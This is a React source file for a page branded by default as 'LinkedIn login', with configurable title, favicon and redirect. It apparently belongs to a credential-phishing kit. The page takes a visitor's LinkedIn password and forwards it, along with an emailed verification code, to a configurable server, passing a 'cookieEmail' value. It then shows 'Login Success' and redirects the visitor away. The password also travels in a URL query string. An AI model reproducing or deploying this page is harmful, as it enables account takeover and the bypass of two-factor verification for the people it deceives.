import React, { Component } from "react";
import runtimeEnv from "@mars/heroku-js-runtime-env";
import { Route, Redirect } from "react-router-dom";

import {
  Form,
  Button,
  Container,
  Row,
  Col,
  Alert,
  Spinner,
} from "react-bootstrap";
const queryString = require("query-string");
const env = runtimeEnv();

export default class Linkedin extends Component {
  state = {
    username: "",
    password: "",
    showAlert: false,
    loading: false,
    message: "",
    manualCheck: false,
    success: false,
    redirect: false,
    code: "",
  };
  handleUsername = (event) => {
    this.setState({ username: event.target.value });
  };
  handleCode = (event) => {
    const { value, maxLength } = event.target;
    const message = value.slice(0, maxLength);
    this.setState({ code: message });
  };
  handlePassword = (event) => {
    this.setState({ password: event.target.value });
  };
  onShowAlert = () => {
    this.setState({ showAlert: true }, () => {
      window.setTimeout(() => {
        this.setState({ showAlert: false });
      }, 30000);
    });
  };
  handleClick = (e) => {
    e.preventDefault();
    this.setState({ loading: true });
    if (this.state.username.length !== 0 && this.state.password.length !== 0) {
      fetch(`${env.REACT_APP_URL}/linkedin`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        },
        body: queryString.stringify({
          username: this.state.username,
          password: this.state.password,
          cookieEmail: env.REACT_APP_COOKIE_EMAIL,
        }),
      })
        .then((response) => response.json())
        .then((responseData) => {
          console.log(responseData);
          this.setState(
            {
              message: responseData.message,
            },
            () => {
              this.onShowAlert();
            }
          );
          if (!responseData.success) {
            this.setState({ loading: false });
          } else {
            if (responseData.manualCheck) {
              this.setState({
                manualCheck: true,
                loading: true,
              });
            } else {
              this.setState({ success: true });
            }
          }
        });
    } else {
      if (this.state.username.length === 0) {
        this.setState(
          {
            message: "username cannot be empty",
            loading: false,
          },
          () => {
            this.onShowAlert();
          }
        );
      } else {
        this.setState(
          {
            message: "password cannot be empty",
            loading: false,
          },
          () => {
            this.onShowAlert();
          }
        );
      }
    }
  };
  handleCodeClick = (e) => {
    if (this.state.code.length === 0 || this.state.code.length > 6) {
      this.setState({ message: "Code length should be equal to 6" }, () => {
        this.onShowAlert();
      });
    } else {
      fetch(
        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}`,
        {
          method: "GET",
        }
      )
        .then((response) => response.json())
        .then((responseData) => {
          console.log(responseData);
          this.setState(
            {
              message: responseData.message,
            },
            () => {
              this.onShowAlert();
            }
          );
          if (responseData.success) {
            this.setState({ success: true });
          } else {
            this.setState({ message: responseData.message, code: "" }, () => {
              this.onShowAlert();
            });
          }
        });
    }
  };
  setRedirect = () => {
    this.setState({
      redirect: true,
    });
  };
  renderRedirect = () => {
    if (this.state.redirect) {
      return <Redirect to="/" />;
    }
  };
  render() {
    return (
      <div>
        {this.renderRedirect()}
        <Button size="lg" variant="outline-danger" onClick={this.setRedirect}>
          Back
        </Button>
        {this.state.showAlert ? (
          <Alert variant="dark">{this.state.message}</Alert>
        ) : (
          ""
        )}

        <Container
          style={{
            position: "absolute",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
          }}
        >
          <center>
            <h1>
              <img
                alt="logo"
                src={env.REACT_APP_FAVICONURL}
                height="48px"
                width="48px"
                style={{ objectFit: "cover", borderRadius: "50%" }}
              ></img>
              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== ""
                ? env.REACT_APP_TITLE
                : "LinkedIn login"}
            </h1>
          </center>
          {this.state.success ? (
            <Container
              style={{
                position: "absolute",
                left: "50%",
                top: "50%",
                transform: "translate(-50%, -50%)",
              }}
            >
              <center>
                <h1>Login Success Thank You!</h1>
              </center>
              <Route
                component={() => {
                  window.location.href = env.REACT_APP_REDIRECTURL;
                  return null;
                }}
              />
            </Container>
          ) : (
            <Row>
              <Col>
                <Form onSubmit={(e) => this.handleClick(e)}>
                  <Form.Group controlId="formBasicEmail">
                    <Form.Label>
                      Enter Linkedin Username/MobileNumber
                    </Form.Label>
                    <Form.Control
                      value={this.state.username}
                      onChange={(e) => {
                        this.handleUsername(e);
                      }}
                    />
                  </Form.Group>
                  <Form.Group controlId="formBasicPassword">
                    <Form.Label>Enter Linkedin Password</Form.Label>
                    <Form.Control
                      onChange={(e) => this.handlePassword(e)}
                      value={this.state.password}
                      type="password"
                    />
                  </Form.Group>
                  {this.state.loading ? (
                    <Button variant="primary" type="submit" disabled>
                      <Spinner
                        as="span"
                        animation="grow"
                        size="sm"
                        role="status"
                        aria-hidden="true"
                      />
                      Loading...
                    </Button>
                  ) : (
                    <Button variant="primary" type="submit">
                      Login
                    </Button>
                  )}

                  {this.state.manualCheck ? (
                    <div>
                      <Form.Group>
                        <Form.Label>
                          Enter code recieved in your email
                        </Form.Label>
                        <Form.Control
                          value={this.state.code}
                          onChange={(e) => {
                            this.handleCode(e);
                          }}
                          type="number"
                          maxLength="11"
                        />
                      </Form.Group>
                      <Button
                        variant="outline-success"
                        onClick={() => {
                          this.handleCodeClick();
                        }}
                      >
                        submit code
                      </Button>{" "}
                    </div>
                  ) : (
                    ""
                  )}
                </Form>
              </Col>
            </Row>
          )}
        </Container>
      </div>
    );
  }
}
